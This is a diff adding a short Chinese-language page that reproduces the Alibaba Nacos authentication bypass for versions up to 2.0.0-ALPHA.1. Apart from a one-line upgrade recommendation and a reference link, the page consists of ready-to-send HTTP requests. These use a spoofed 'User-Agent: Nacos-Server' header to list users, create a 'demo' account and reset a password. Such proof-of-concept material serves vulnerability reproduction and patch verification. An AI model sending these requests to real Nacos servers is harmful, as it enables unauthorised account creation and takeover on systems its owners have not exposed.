@@ -1,0 +1,19 @@
+<div class="markdown-heading"><h1 class="heading-element">Alibaba Nacos权限认证绕过漏洞复现</h1><a id="user-content-alibaba-nacos权限认证绕过漏洞复现" class="anchor" aria-label="Permalink: Alibaba Nacos权限认证绕过漏洞复现" href="#alibaba-nacos权限认证绕过漏洞复现"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
+<div class="markdown-heading"><h2 class="heading-element">影响版本: Nacos &lt;= 2.0.0-ALPHA.1</h2><a id="user-content-影响版本-nacos--200-alpha1" class="anchor" aria-label="Permalink: 影响版本: Nacos &lt;= 2.0.0-ALPHA.1" href="#影响版本-nacos--200-alpha1"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
+<div class="markdown-heading"><h2 class="heading-element">修复建议: 官方已发布安全版本，建议下载或升级至最新版本</h2><a id="user-content-修复建议-官方已发布安全版本建议下载或升级至最新版本" class="anchor" aria-label="Permalink: 修复建议: 官方已发布安全版本，建议下载或升级至最新版本" href="#修复建议-官方已发布安全版本建议下载或升级至最新版本"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
+<div class="markdown-heading"><h2 class="heading-element">相关链接: <a href="https://www.freebuf.com/vuls/263845.html" rel="nofollow">https://www.freebuf.com/vuls/263845.html</a>
+</h2><a id="user-content-相关链接-httpswwwfreebufcomvuls263845html" class="anchor" aria-label="Permalink: 相关链接: https://www.freebuf.com/vuls/263845.html" href="#相关链接-httpswwwfreebufcomvuls263845html"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
+<p>@nacos=<a href="http://127.0.0.1:8849/nacos" rel="nofollow">http://127.0.0.1:8849/nacos</a></p>
+<div class="markdown-heading"><h3 class="heading-element">查询用户</h3><a id="user-content-查询用户" class="anchor" aria-label="Permalink: 查询用户" href="#查询用户"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
+<p>GET {{nacos}}/v1/auth/users?pageNo=1&amp;pageSize=10
+User-Agent: Nacos-Server</p>
+<div class="markdown-heading"><h3 class="heading-element">创建用户</h3><a id="user-content-创建用户" class="anchor" aria-label="Permalink: 创建用户" href="#创建用户"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
+<p>POST {{nacos}}/v1/auth/users
+User-Agent: Nacos-Server
+Content-Type: application/x-www-form-urlencoded</p>
+<p>username=demo&amp;password=demo</p>
+<div class="markdown-heading"><h3 class="heading-element">密码重置</h3><a id="user-content-密码重置" class="anchor" aria-label="Permalink: 密码重置" href="#密码重置"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
+<p>PUT {{nacos}}/v1/auth/users
+User-Agent: Nacos-Server
+Content-Type: application/x-www-form-urlencoded</p>
+<p>username=demo&amp;newPassword=demodemo</p>
